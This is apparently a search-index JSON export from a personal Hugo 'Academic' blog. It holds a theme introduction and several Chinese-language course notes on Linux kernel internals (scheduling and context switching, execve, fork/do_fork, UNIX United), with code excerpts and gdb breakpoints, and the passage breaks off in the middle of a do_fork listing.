to ensure that your site looks stunning on every device.   Key features:\n Page builder - Create anything with widgets and elements Edit any type of content - Blog posts, publications, talks, slides, projects, and more! Create content in Markdown, Jupyter, or RStudio Plugin System - Fully customizable color and font themes Display Code and Math - Code highlighting and LaTeX math supported Integrations - Google Analytics, Disqus commenting, Maps, Contact Forms, and more! Beautiful Site - Simple and refreshing one page design Industry-Leading SEO - Help get your website found on search engines and social media Media Galleries - Display your images and videos with captions in a customizable gallery Mobile Friendly - Look amazing on every screen with a mobile friendly version of your site Multi-language - 15+ language packs including English, 中文, and Português Multi-user - Each author gets their own profile page Privacy Pack - Assists with GDPR Stand Out - Bring your site to life with animation, parallax backgrounds, and scroll effects One-Click Deployment - No servers. No databases. Only files.  Themes Academic comes with automatic day (light) and night (dark) mode built-in. Alternatively, visitors can choose their preferred mode - click the sun/moon icon in the top right of the Demo to see it in action! Day/night mode can also be disabled by the site admin in params.toml.\n Choose a stunning theme and font for your site. Themes are fully customizable.\nEcosystem   Academic Admin: An admin tool to import publications from BibTeX or import assets for an offline site  Academic Scripts: Scripts to help migrate content to new versions of Academic  Install You can choose from one of the following four methods to install:\n  one-click install using your web browser (recommended)  install on your computer using Git with the Command Prompt/Terminal app  install on your computer by downloading the ZIP files  install on your computer with RStudio  Then personalize and deploy your new site.\nUpdating  View the Update Guide.\nFeel free to star the project on Github to help keep track of updates.\nLicense Copyright 2016-present George Cushen.\nReleased under the MIT license.\n","date":1461110400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1555459200,"objectID":"279b9966ca9cf3121ce924dca452bb1c","permalink":"http://www.guozet.me/post/getting-started/","publishdate":"2016-04-20T00:00:00Z","relpermalink":"/post/getting-started/","section":"post","summary":"Create a beautifully simple website in under 10 minutes.","tags":["Academic","开源"],"title":"Academic: the website builder for Hugo","type":"post"},{"authors":null,"categories":"Linux","content":" 唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n学习目录索引 Linux内核分析学习博客整理：\n Linux内核分析课程1_计算机是如何工作的\n计算机的工作过程，一言以蔽之：执行程序的过程；所以分析计算机的工作原理也就是分析计算机存储程序，执行程序的原理，所以，我们就需要先通过了解程序存储的这个过程。\n 这篇博客主要分析了计算机的组成和计算机的工作原理，并例举C语言和汇编的转化，最后给出了程序执行时候堆栈变化的动态示意图.\n  Linux内核分析课程2_操作系统是如何工作的\n操作系统的工作原理，可以说是计算机工作原理的第二部分：程序控制的过程，程序控制的体现有中断，系统调用，进程调度等。\n 博客中主要分析了操作系统的工作过程，用了一个时间中断函数来模拟了中断程序执行的过程，并给出了相应的堆栈变化示意图。\n  Linux内核分析课程3_start_kernel()函数分析\nstart_kernel()这个函数是内核由引导程序引导以后，由自解压程序解压以后执行的第一个函数，可以认为是整个内核的入口函数，start_kernel()做的工作就是线性的初始化一些内核的基础机制，如中断，内存管理，进程管理，信号，文件系统，KO等！最后就启动一个init线程，init线程再读取文件系统里的init程序，做为系统的第一个进程而存在！\n 博客中对linux启动过程中的start_kernel()函数进行分析，了解其主要的实现功能，在这里，主要对代码进行了解析。主要解析了：start_kernel() -\u0026gt; rest_init() -\u0026gt; kernel_init() -\u0026gt; 启动init进程。\n  Linux内核分析课程4_Linux系统调用\n系统调用，顾名思义，说的是操作系统提供给用户程序调用的一组“特殊”接口。用户程序可以通过这组“特殊”接口来获得操作系统内核提供的服务，比如用户可以通过文件系统相关的调用请求系统打开文件、关闭文件或读写文件，可以通过时钟相关的系统调用获得系统时间或设置定时器等。\n从逻辑上来说，系统调用可被看成是一个内核与用户空间程序交互的接口——它好比一个中间人，把用户进程的请求传达给内核，待内核把请求处理完毕后再将处理结果送回给用户空间。\n 博客中详细的分析了系统调用的原理，实现方式和意义；API，系统调用，系统命令，内核函数之间的区别，最后分别用C语言和汇编来实现了exit系统调用。\n  Linux内核分析课程5_system_call中断处理过程\n系统调用流程介绍：\n 执行用户程序(如:fork,exit) 根据glibc中的函数实现，取得系统调用号并执行int $0x80产生中断。 进行地址空间的转换和堆栈的切换，执行SAVE_ALL。（进行内核模式） 进行中断处理，根据系统调用表调用内核函数。 执行内核函数。 执行RESTORE_ALL并返回用户模式   本文中使用gdb调试了sys_exit系统调用，并对系统调用的源代码进行了详细的分析。\n  Linux内核分析课程6_进程创建\n在 Linux 内核中,供用户创建进程的系统调用fork()函数的响应函数是 sys_fork()、sys_clone()、sys_vfork()。这三个函数都是通过调用内核函数 do_fork() 来实现的。\n 本篇博客详细分析了进程创建过程(fork())的详细执行过程。\n  Linux内核分析课程7_execve()函数对应的系统调用处理过程\n昔者庄周梦为蝴蝶，栩栩然蝴蝶也，自喻适志与，不知周也。俄然觉，则蘧蘧然周也。不知周之梦为蝴蝶与，蝴蝶之梦为周与？周与蝴蝶，则必有分矣。此之谓物化。（《庄子·齐物论》）\n在我们的操作系统中,也有如此浪漫情怀的庄生梦蝶—–exec()函数族.\n 博客中中对exec()函数族进行了介绍，之后对do_execve()函数进行了分析。\n  Linux内核分析课程8_进程调度与进程切换过程 进程调度中schedule()函数选择一个新的进程来运行，并调用context_switch进行上下文的切换，这个宏调用switch_to来进行关键上下文切换。\n主要调用过程：\nnext = pick_next_task(rq, prev);//进程调度算法都封装这个函数内部 context_switch(rq, prev, next);//进程上下文切换 switch_to利用了prev和next两个参数：prev指向当前进程，next指向被调度的进程   博客中对schedule函数进行了相关介绍，以及分析了schedule函数的内核实现的详细流程。\n  Linux内核分析课程9_UNIX United操作系统分析\n 学习心得 对Linux系统的认识 很幸运参加了这为期两个月的MOOC课程《Linux内核分析》，让我对Linux系统有了更深的认识。\n Linux系统的开源思想是最值得我们学习的，开源的思想也会成为我们软件行业的主导的。 Linux系统最为核心也就是进程调度，中断处理，时钟和文件系统，我们只要对这几个方面了解到了，也就了解了Linux系统的关键了。  学习Linux内核的心得 学习Linux内核的过程也半年多了，从嵌入式系统设计中的ucos初步认识操作系统(核心：进程调度)，嵌入式操作系统中的（ARM中的Linux）再到Linux内核分析(x86体系下)，一步一步的深入，在这个过程中，有几本书对我影响很多，给大家推荐一下:\n《Linux内核设计与实现》，想学习linux内核就要先了解相应的机制之后再去看源代码的话，可能会收获到更多，而这本书介绍了诸如进程管理、系统调用、中断和中断处理程序、内核同步、时间管理、内存管理、地址空间、调试技术等方面，内容比较浅显易懂，比较适合学习Linux内核的新人.\n之后就不得不提到《深入理解Linux内核》这本书了，这本最好是能深入学习。简而言之，第一本，提纲性阅读；第二本，适合深入阅读。\n当然，纸上得来终觉浅，绝知此事要躬行；在书本学习的基础上，需要我们利用好gdb这个调试工具，多跟踪一下内核的一些机制的执行流程，在实践中验证知识，才能更好的掌握知识。\n","date":1434287067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1434287067,"objectID":"eb412d5e2a9d5800de9663c1fbc86cfd","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-catalogue/","publishdate":"2015-06-14T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-catalogue/","section":"post","summary":" 唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n","tags":"Linux kernel","title":"Linux内核分析课程_学习索引","type":"post"},{"authors":null,"categories":"Linux","content":"Linux内核课第九周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\nUNIX操作系统，是一个强大的多用户、多任务操作系统，支持多种处理器架构，按照操作系统的分类，属于分时操作系统\n UNIX United is an architecture for a distributed system based on UNIX. UNIX United可以看做是一种多台UNIX组成分布式系统的解决方案。\n 1.Introduction UNIX United系统是通过将一组的UNIX系统计算机，在上层叠加一个系统方式，是值在操作的时候，完全隐藏所有的处理器通信和网络协议。并且所有的UNUX工作方式（如：设备保护，访问和文件访问，进程间通信，输入/输出，重定向）都是一样的，和独立的UNIX没有任何差别。\n 参考文献： 《The Newcastle Connection or UNIXes of the world Unite!》 《The Architecture of UNIX United》\n 疑问：对文件访问的控制是怎么处理的呢？\n2.对文件访问的处理 简单的举一个例子，我们有两个独立的UNIX系统主机，现在将其构建成UNIX United System, 构建之后，UNIX1的用户如何读取UNIX2的文件呢？\n　不知道大家是否还记得: “ / ” 表示根目录，“ .. ”表示当前目录的上一层目录，那么问题来了，“ /.. ”表示什么呢？\n 如果在UNIX１主机上复制文件a到UNIX２上，可以这样操作。 cp /user/brian/a /../unix2/user/brian/a 现在问题再一次出现，这个cp使用的是UNIX1中的cp还是UNIX2中的cp呢？\n ３.用户认证和访问权限控制 UNIX中用户认证相关的文件：用户，组，用户密码，Root UNIX United System中，各个子UNIX System拥有自己独立的users,user groups and user password file,root; 但每个系统都有义务对要登录UNIX United System的用户进行认证，那怎么认证呢？ 比如机器A上的用户u, 我们记为“A/u”，身份认证由A完成，但用户u可以访问所有A和B上属于该用户的文件。\n4.连接通信-远程文件访问的处理 在原有UNIX的基础上添加了一个通信链路和一个软件层, 这两部分的位置在UNIX Kernel和UNIX software之间。Newcastle Connection相当于是一个“过滤器”，过滤出要重定向其他系统的系统调用，而UNIX1和UNIX2之间的通信是通过远程过程调用(Remote Procedure Call，RPC)来交流的。\n流程如下所示：\n 上层应用发出一个系统调用； Newcastle Connection检测该系统调用是不是远程调用；不是远程调用则直接转换为本地的系统调用（内核服务）；如果是对远程的文件进程操作，则是远程调用。 远程调用，则通过连接层将命令(加上额外信息，如当前用户id)发送到远程主机上（连接层相当于管道，连接了UNIX1和UNIX2）; 连接层解析文件的名称（如： /../UNIX2/）将其传递给对应的计算机。 远程主机调用对应进程来处理（即UNIX United中只有本地操作），远程主机返回执行情况 ","date":1431003867,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1431003867,"objectID":"97d6a5212667d24ef59a25b07de6ad41","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-UNIX-United-System/","publishdate":"2015-05-07T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-UNIX-United-System/","section":"post","summary":"Linux内核课第九周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n","tags":"Linux kernel","title":"Linux内核分析课程9_UNIX United操作系统分析","type":"post"},{"authors":null,"categories":"Linux","content":"Linux内核课第八周作业。本文在云课堂中实验楼完成。 原创作品转载请注明出处 《Linux内核分析》MOOC课程\n 一.schedule()函数介绍 １.进程调度的时机 中断处理过程（包括时钟中断、I/O中断、系统调用和异常）中，直接调用schedule()，或者返回用户态时根据need_resched标记调用schedule()；\n 内核线程可以直接调用schedule()进行进程切换，也可以在中断处理过程中进行调度，也就是说内核线程作为一类的特殊的进程可以主动调度，也可以被动调度；\n用户态进程无法实现主动调度，仅能通过陷入内核态后的某个时机点进行调度，即在中断处理过程中进行调度。\n 2.进程的切换 为了控制进程的执行，内核必须有能力挂起正在CPU上执行的进程，并恢复以前挂起的某个进程的执行，这叫做进程切换、任务切换、上下文切换；\n挂起正在CPU上执行的进程，与中断时保存现场是不同的，中断前后是在同一个进程上下文中，只是由用户态转向内核态执行；\n进程上下文包含了进程执行需要的所有信息：\n 用户地址空间: 包括程序代码，数据，用户堆栈等 控制信息: 进程描述符，内核堆栈等 硬件上下文（注意中断也要保存硬件上下文只是保存的方法不同）  3.具体进程切换的代码分析 schedule()函数选择一个新的进程来运行，并调用context_switch进行上下文的切换，这个宏调用switch_to来进行关键上下文切换：\n 主要调用过程：\n next = pick_next_task(rq, prev);//进程调度算法都封装这个函数内部 context_switch(rq, prev, next);//进程上下文切换 switch_to利用了prev和next两个参数：prev指向当前进程，next指向被调度的进程   1)schedule()函数 首先，切换时候，调用call schedule()；来执行schedule（）函数，如下图所示：\n使用struct task_struct *tsk = current; 来获取当前进程；sched_submit_work(tsk); 避免死锁；最后调用＿schedule()来处理切换过程\n２)＿schedule()函数 其中 need_resched:为切换前的变量准备：\n preempt_disable()；//禁止内核抢占；\ncpu = smp_processor_id(); //获取当前CPU rq = cpu_rq(cpu); //获取该CPU维护的运行队列（run queue)\nrcu_note_context_switch(cpu); //更新全局状态，标识当前CPU发生上下文的切换\nprev = rq-\u0026gt;curr; //运行队列中的curr指针赋予prev。\n 其中的next=pick_next_task(rq, prev)来确定使用哪一种进程调度的策略，但总是选择了下一个进程来进行切换，即根据调度策略选择一个优先级最高的任务将其定为下一个进程，最后都是调用context_switch来进行进程上下文的切换过程．\n３)context_switch函数解析 其中prepare_task_switch（）函数是完成切换前的准备工作；接着后面判断当前进程是不是内核线程，如果是内核线程，则不需要切换上下文\n接着调用switch_mm(),把虚拟内存从一个进程映射切换到新进程中\n调用switch_to(),从上一个进程的处理器状态切换到新进程的处理器状态。这包括保存、恢复栈信息和寄存器信息\n 如果next是内核线程，则线程使用prev所使用的地址空;schedule( )函数把该线程设置为懒惰TLB模式\n 事实上，每个内核线程并不拥有自己的页表集(task_struct-\u0026gt;mm = NULL)；更确切地说，它使用一个普通进程的页表集。不过，没有必要使一个用户态线性地址对应的TLB表项无效，因为内核线程不访问用户态地址空间。\n如果next是一个普通进程，schedule( )函数用next的地址空间替换prev的地址空间\n　|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;| | } else | | switch_mm(oldmm, mm, next); | |\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;|\n如果prev是内核线程或正在退出的进程，context_switch()函数就把指向prev内存描述符的指针保存到运行队列的prev_mm字段中，然后重新设置prev-\u0026gt;active_mm\ncontext_switch()最后调用switch_to()执行prev和next之间的进程切换了 |\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-| | switch_to(prev, next, prev); | |\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-| return prev; }\n４)switch_to（）函数解析  switch_to(prev, next, prev)：切换堆栈和寄存器的状态．\nswitch_to是一个宏定义，完成的工作主要是：\n(1)保存当前进程的flags状态和当前进程的ebp \u0026quot;pushfl\\n\\t\u0026quot;\t/* save flags */\t\u0026quot;pushl %%ebp\\n\\t\u0026quot;\t/* save EBP */\t (2)完成内核堆在esp的切换 \u0026quot;movl %%esp,%[prev_sp]\\n\\t\u0026quot; /* save ESP */ \u0026quot;movl %[next_sp],%%esp\\n\\t\u0026quot; /* restore ESP */  进程切换的时候，要修改堆栈，eip等数据．在switch_to中完成了这个工作。\n(3)保存eip的值 \u0026quot;movl $1f,%[prev_ip]\\n\\t\u0026quot; /* save EIP */ \\\r\u0026quot;pushl %[next_ip]\\n\\t\u0026quot; /* restore EIP */ \\\r 将标号1:的地址保存到prev-\u0026gt;thread.ip中，然后下一次该进程被调用的时候，就从１的位置开始执行。  注明：如果之前next也被switch_to出去过，那么next-\u0026gt;thread.ip里存的就是下面这个1f的标号，但如果next进程刚刚被创建，之前没有被switch_to出去过，那么next-\u0026gt;thread.ip里存的将是ret_ftom_fork，即进程刚刚被fork后执行exec．\n (4)jmp __switch_to 让参数不压入堆栈，而是使用寄存器传值，来调用__switch_to eax存放prev,edx存放next。\n二.gdb跟踪schedule函数  小结：整个schedule的执行过程如下图所示\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-| schedule\nsched_submit_work(tsk)\n_schedule()\npick_next_task\ncontext_switch(rq,prev,next)\nprepare_task_switch\n判断是不是内核线程\nswitch_mm\nswitch_to\n_switch_to\nfinish_task_switch\n","date":1427029467,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1427029467,"objectID":"b34a5f67bdc2591d0170c963d6fb4e91","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-task-management/","publishdate":"2015-03-22T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-task-management/","section":"post","summary":"Linux内核课第八周作业。本文在云课堂中实验楼完成。 原创作品转载请注明出处 《Linux内核分析》MOOC课程\n","tags":"Linux kernel","title":"Linux内核分析课程8_进程调度与进程切换过程","type":"post"},{"authors":null,"categories":"Linux","content":"Linux内核课第七周作业。本文在云课堂中实验楼完成。 唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n昔者庄周梦为蝴蝶，栩栩然蝴蝶也，自喻适志与，不知周也。俄然觉，则蘧蘧然周也。不知周之梦为蝴蝶与，蝴蝶之梦为周与？周与蝴蝶，则必有分矣。此之谓物化。（《庄子·齐物论》）\n在我们的操作系统中,也有如此浪漫情怀的庄生梦蝶\u0026mdash;\u0026ndash;exec()函数族.\n庄周（调用execve的可执行程序）入睡（调用execve陷入内核），醒来（系统调用execve返回用户态）发现自己是蝴蝶（被execve加载的可执行程序）\n一. exec函数族 (一) 介绍 fork()函数, 相当于是创建了一个新的进程, 但该子进程复制的确实父进程的内容, 如果让其执行下去,那么也是执行和父进程相同的内容呢, 但实际中,我们执行的是新的任务, 那么在这里是如何实现的呢?\nexec函数族就实现了在一个进程中启动另外一个程序的方法. 它可以根据指定的文件名或目录名找到可执行文件，并用它来取代原调用进程的数据段、代码段和堆栈段，在执行完之后，原调用进程的内容除了进程号外，其他全部被新的进程替换了。另外，这里的可执行文件既可以是二进制文件，也可以是Linux下任何可执行的脚本文件。\n那什么时候使用exec函数呢? 除了我们上面提到的fork()之后调用exec()函数来执行一个新进程外,还有当进程认为自己继续执行下去也没有什么实际的工作的时候,就可以调用exec函数来庄周梦蝶,化成蝶了.\n(二) 函数族具体实现 在linux下,有六个exec开头的函数, 来实现:\n这6个函数在函数名和使用语法的规则上都有细微的区别，下面就从可执行文件查找方式、参数传递方式和环境变量这几个方面进行比较。\n  查找方式：表1中的前4个函数的查找方式都是完整的文件目录路径，而最后两个函数（也就是以 p 结尾的两个函数）可以只给出文件名，系统就会自动按照环境变量“$PATH” 所指定的路径进行查找。\n  参数传递方式：exec函数族的参数传递有两种：一种是逐个列举的方式，而另一种则是将所有参数整体构造指针数组传递。在这里是以函数名的第5位字母来区分的，字母为 \u0026ldquo;l\u0026rdquo;(list)的表示逐个列举参数的方式，其语法为：\n`const char *arg;字母为“v”(vector)的表示将所有参数整体构造指针数组传递，其语法为 char *const argv[]\u0026lsquo;``。\n这里的参数实际上就是用户在使用这个可执行文件时所需的全部命令选项字符串（包括该可执行程序命令本身）。要注意的是，这些参数必须以NULL结束。\n  环境变量： exec函数族可以默认系统的环境变量，也可以传入指定的环境变量。这里以 “e”(environment)结尾的两个函数 execle()和 execve()就可以在 envp[]中指定当前进程所使用的环境变量。\n表2再对这6个函数中的函数名和对应语法做了一个小结，主要指出了函数名中每一位对应所表明的含义，以此表加以记住这6个函数。\n  　事实上，这6个函数中真正的系统调用只有execve()，其他5个都是库函数，它们最终都会调用execve()这个系统调用。在使用exec函数族时，一定要加上错误判断语句。exec 很容易执行失败，其中最常见的原因有：\n 找不到文件或路径，此时 errno 被设置为 ENOENT。 数组argv 和envp 忘记用NULL结束，此时，errno被设置为 EFAUL。 没有对应可执行文件的运行权限，此时 errno 被设置为EACCES。  二.实验分析 实践来检验理论, 才能让自己的知识学习的更加牢固。\n进入gdb调试,设置断点:\n　主要设置了以下几个断点。\nb sys_execve\rb do_execve\rb do_open_exev\rb do search_binary_handler\rb load_elf_binary\rb start_thread\rb init_elf_binfmt\r 下面就主要分析这几个断点处的函数功能实现了.\n1.首先分析函数实现 在函数中,我们可明显的看到,在fork执行完成之后,我们通过execlp()加载了可执行程序hello.\n在这里调用的是execlp(), 最终调用的也是execve()这个系统调用。\n清晰的看到, 系统调用之后执行了do_execve()\n2.do_execve()函数分析 1)在do_execve中限设置了相应的参数和环境变量,然后调用了do_execve_common()函数 2)do_execve_common()函数介绍 在do_execve_common()函数中,先打开对应文件,在这里是hello\n接着将文件名,环境变量,命令行参数拷贝到新分配的页面中:\n最后执行 exec_binprm来执行该可执行文件格式的处理函数:\n接着详细分析exec_binprm中函数的执行过程, 分析如何来加载elf文件格式的.\n在该函数中, 可以看到调用了search_binary_handler(bprm)函数,该函数寻找符合文件格式对应的解析模块.\n其中的linux_binfmt *fmt结构体为:\n我们这里调用的是hello可执行文件,为elf格式,所有最后查找后调用为:\n对应elf格式查找可得:\n对于ELF格式的可执行文件fmt-\u0026gt;load_binary(bprm);执行的应该是load_elf_binary其内部是和ELF文件格式解析的部分需要和ELF文件格式标准结合起来阅读\n对应elf文件的格式为:\n整个ELF映像就是由文件头、区段头表、程序头表、一定数量的区段、以及一定数量的部构成，而ELF映像的装入/启动过程，则就是在各种头部信息的指引下将某些部或区段装入一个进程的用户空间，并为其运行做好准备(例如装入所需的共享库)，最后(在目标进程首次受调度运行时)让CPU进入其程序入口的过程。接着是对elf_bss 、elf_brk、start_code、end_code等等变量的初始化。这些变量分别纪录着当前(到此刻为止)目标映像的bss段、代码段、数据段、以及动态分配“堆” 在用户空间的位置。除start_code的初始值为0xffffffff外，其余均为0。随着映像内容的装入，这些变量也会逐步得到调整。\nload_elf_binary函数的作用就是读入了程序头表，并对start_code等变量进行初始化.\n在load_elf_binary的最后调用\n在这里就把新程序的ip和sp存入堆栈,覆盖掉了之前的ip,sp,之后,子进程返回的话,就从hello中的main开始执行了.\n3.函数执行流程示意图: execlp-\u0026gt;hello\rcall *sys_execve\r........do_execve\r................. do_execve_common\r......................... exec_binprm\r...................................search_binary_handler(bprm)\r.........................................linux_binfmt= elf_format\r..............................................elf_format-\u0026gt; load_elf_binary\r..............................................load_elf_binary\r.....................................................start_thread\rret\r ","date":1426338267,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1426338267,"objectID":"36f04cacba021220bbe3f5ace05ea0a0","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-execve-Function/","publishdate":"2015-03-14T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-execve-Function/","section":"post","summary":"Linux内核课第七周作业。本文在云课堂中实验楼完成。 唐国泽","tags":"Linux kernel","title":"Linux内核分析课程7_execve()函数对应的系统调用处理过程","type":"post"},{"authors":null,"categories":"Linux","content":"Linux内核课第六周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\nfork()系统调用 预备知识 这里先列出一些必要的预备知识，对linux下进程机制比较熟悉的朋友可以略过。\n 进程可以看做程序的一次执行过程。在linux下，每个进程有唯一的PID标识进程。PID是一个从1到32768的正整数，其中1一般是特殊进程init，其它进程从2开始依次编号。当用完32768后，从2重新开始。 linux中有一个叫进程表的结构用来存储当前正在运行的进程。可以使用“ps aux”命令查看所有正在运行的进程。 进程在linux中呈树状结构，init为根节点，其它进程均有父进程，某进程的父进程就是启动这个进程的进程，这个进程叫做父进程的子进程。   [上述摘自: 从一道面试题谈linux下fork的运行机制]\n 下面分析一个简单的例子:\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;unistd.h\u0026gt;\rint main(int argc, char * argv[])\r{\rint pid;\r/* fork another process */\rpid = fork();\rif (pid \u0026lt; 0) { /* error occurred */\rfprintf(stderr,\u0026quot;Fork Failed!\u0026quot;);\rexit(-1);\r} else if (pid == 0) {\r/* child process */\rprintf(\u0026quot;This is Child Process!\\n\u0026quot;);\r} else { /* parent process */\rprintf(\u0026quot;This is Parent Process!\\n\u0026quot;);\r/* parent will wait for the child to complete*/\rwait(NULL);\rprintf(\u0026quot;Child Complete!\\n\u0026quot;);\r}\r}\r 比较简单,运行结果为:\nThis is Child Process!\rThis is Parent Process!\rChild Complete!\r 在pid = fork()前,只有一个进程执行这段代码,但在这条语句滞后,就有两个进程在执行后面的代码了,接下来的代码是:\nif(pid.....)\n补充: fork语句的返回值,fork系统调用调用一次, 返回两次, 在这里有可能有三种返回值\n 在父进程中，fork返回新创建子进程的进程ID 在子进程中，fork返回0 如果出现错误，fork返回一个负值  所有在这段代码中, 如果pid = fork()执行成功, 那就有两个进程了, 一个父进程和一个子进程, 在子进程中，fork函数返回0，在父进程中，fork返回新创建子进程的进程ID。我们可以通过fork返回的值来判断当前进程是子进程还是父进程。\nfork出错可能有两种原因：\n 当前的进程数已经达到了系统规定的上限，这时errno的值被设置为EAGAIN。系统内存不足，这时errno的值被设置为ENOMEM。 创建新进程成功后，系统中出现两个基本完全相同的进程，这两个进程执行没有固定的先后顺序，哪个进程先执行要看系统的进程调度策略。  参考博文: linux中fork（）函数详解（原创！！实例讲解）\nfork对应的系统调用过程 在 Linux 内核中,供用户创建进程的系统调用fork()函数的响应函数是 sys_fork()、sys_clone()、sys_vfork()。\n这三个函数都是通过调用内核函数 do_fork() 来实现的。根据调用时所使用的 clone_flags 参数不同，do_fork() 函数完成的工作也各异。下面分析do_fork(), 该函数主要作用是复制原来的进程成为另一个新的进程，它完成了整个进程的创建过程。\ndo_fork()函数的几个参数:   clone_flags：该标志位的4个字节分为两部分。最低的一个字节为子进程结束时发送给父进程的信号代码，通常为SIGCHLD；剩余的三个字节则是各种clone标志的组合。通过clone标志可以有选择的对父进程的资源进行复制。例如CLONE_VM表示共享内存描述符合所有的页表； CLONE_FS共享根目录和当前工作目录所在的表以及权限掩码。\n  statck_start：子进程用户态堆栈的地址；\n  regs：指向pt_regs结构体的指针。当系统发生系统调用，即用户进程从用户态切换到内核态时，该结构体保存通用寄存器中的值，并被存放于内核态的堆栈中；\n  stack_size：未被使用，通常被赋值为0；\n  parent_tidptr：父进程在用户态下pid的地址，该参数在CLONE_PARENT_SETTID标志被设定时有意义；\n  child_tidptr：子进程在用户态下pid的地址，该参数在CLONE_CHILD_SETTID标志被设定时有意义。\n  do_fork() 函数生成一个新的进程  建立进程控制结构并赋初值，使其成为进程映像。这个过程完成以下内容。    在内存中分配一个 task_struct 数据结构，以代表即将产生的新进程。 把父进程 PCB 的内容复制到新进程的 PCB 中。 **为新进程分配一个唯一的进程标识号 PID 和 user_struct 结构。**然后检查用户具有执行一个新进程所必须具有的资源。 重新设置 task_struct 结构中那些与父进程值不同的数据成员。 设置进程管理信息，根据所提供的 clone_flags 参数值，决定是否对父进程 task_struct 中的指针 fs 、files 指针等所选择的部分进行拷贝，如果 clone_flags 参数指明的是共享而不是拷贝，则将其计数器 count 的值加 1 ，否则就拷贝新进程所需要的相关信息内容 PCB 。这个地方是区分 sys_fork() 还是 sys_clone() 。    必须为新进程的执行设置跟踪进程执行情况的相关内核数据结构。包括 任务数组、自由时间列表 tarray_freelist 以及 pidhash[] 数组。这部分完成如下内容：    把新进程加入到进程链表中 把新进程加入到 pidhash 散列表中，并增加任务计数值。 通过拷贝父进程的上、下文来初始化硬件的上下文（TSS段、LDT以及 GDT）。    启动调度程序，使子进程获得运行的机会。这部分完成以下动作：    设置新的就绪队列状态 TASK_RUNING , 并将新进程挂到就绪队列中，并重新启动调度程序使其运行。 向父进程返回子进程的 PID，设置子进程从 do_fork() 返回 0 值。   int do_fork(unsigned long clone_flags,unsigned long stack_start, struct pt_regs *regs,\runsigned long stack_size)\r{\rint retval;\rstruct task_struct *p;\rstruct completion vfork;\rretval = -EPERM ;\rif ( clone_flags \u0026amp; CLONE_PID )\r{\rif ( current-\u0026gt;pid )\rgoto fork_out;\r}\rreval = -ENOMEM ;\rp = alloc_task_struct(); // 分配内存建立新进程的 task_struct 结构\rif ( !p )\rgoto fork_out;\r*p = *current ; //将当前进程的 task_struct 结构的内容复制给新进程的 PCB结构\rretval = -EAGAIN;\r//下面代码对父、子进程 task_struct 结构中不同值的数据成员进行赋值\rif ( atomic_read ( \u0026amp;p-\u0026gt;user-\u0026gt;processes ) \u0026gt;= p-\u0026gt;rlim[RLIMIT_NPROC].rlim_cur\r\u0026amp;\u0026amp; !capable( CAP_SYS_ADMIN ) \u0026amp;\u0026amp; !capable( CAP_SYS_RESOURCE ))\rgoto bad_fork_free;\ratomic_inc ( \u0026amp;p-\u0026gt;user-\u0026gt;__count); //count 计数器加 1\ratomic_inc ( \u0026amp;p-\u0026gt;user-\u0026gt;processes); //进程数加 1\rif ( nr_threads \u0026gt;= max_threads )\rgoto bad_fork_cleanup_count ;\rget_exec_domain( p-\u0026gt;exec_domain );\rif ( p-\u0026gt;binfmt \u0026amp;\u0026amp; p-\u0026gt;binfmt-\u0026gt;module )\r__MOD_INC_USE_COUNT( p-\u0026gt;binfmt-\u0026gt;module ); //可执行文件 binfmt 结构共享计数 + 1 p-\u0026gt;did_exec = 0 ; //进程未执行\rp-\u0026gt;swappable = 0 ; //进程不可换出\rp-\u0026gt;state = TASK_UNINTERRUPTIBLE ; //置进程状态\rcopy_flags( clone_flags,p ); //拷贝进程标志位\rp-\u0026gt;pid = get_pid( clone_flags ); //为新进程分配进程标志号\rp-\u0026gt;run_list.next = NULL ;\rp-\u0026gt;run_list.prev = NULL ;\rp-\u0026gt;run_list.cptr = NULL ;\rinit_waitqueue_head( \u0026amp;p-\u0026gt;wait_childexit ); //初始化 wait_childexit 队列\rp-\u0026gt;vfork_done = NULL ;\rif ( clone_flags \u0026amp; CLONE_VFORK ) {\rp-\u0026gt;vfork_done = \u0026amp;vfork ; init_completion(\u0026amp;vfork) ;\r}\rspin_lock_init( \u0026amp;p-\u0026gt;alloc_lock );\rp-\u0026gt;sigpending = 0 ;\rinit_sigpending( \u0026amp;p-\u0026gt;pending );\rp-\u0026gt;it_real_value = p-\u0026gt;it_virt_value = p-\u0026gt;it_prof_value = 0 ; //初始化时间数据成员\rp-\u0026gt;it_real_incr = p-\u0026gt;it_virt_incr = p-\u0026gt;it_prof_incr = 0 ; 